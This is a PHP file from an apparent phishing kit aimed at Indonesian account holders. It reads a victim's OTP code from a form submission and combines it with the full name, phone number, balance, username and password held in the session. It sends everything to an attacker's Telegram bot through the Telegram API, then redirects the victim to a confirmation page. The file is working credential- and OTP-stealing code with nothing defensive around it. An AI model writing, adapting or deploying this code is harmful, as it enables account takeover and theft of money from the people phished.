<?php
include "telegram.php";
session_start();

$sms = $_POST['sms'];

$_SESSION['sms'] = $sms;

$nama = $_SESSION['nama'];
$nohp = $_SESSION['nohp'];
$saldo = $_SESSION['saldo'];
$username = $_SESSION['username'];
$pass = $_SESSION['pass'];

$message = "
✧━━━━━━[ 𝚃𝙷𝙰𝙽𝙺 𝚈𝙾𝚄 ]━━━━━━✧

- 𝙽𝙰𝙼𝙰 𝙻𝙴𝙽𝙶𝙺𝙰𝙿 : ".$nama."
- 𝙽𝙾 𝙷𝙿 : ".$nohp."
- 𝚂𝙰𝙻𝙳𝙾 : ".$saldo."
- 𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 : ".$username."
- 𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 : ".$pass."
- 𝙲𝙾𝙳𝙴 𝙾𝚃𝙿 : ".$sms."
 ";

function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=markdown&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($id_telegram, $message, $id_botTele);
header('Location: ../konf.html');
?>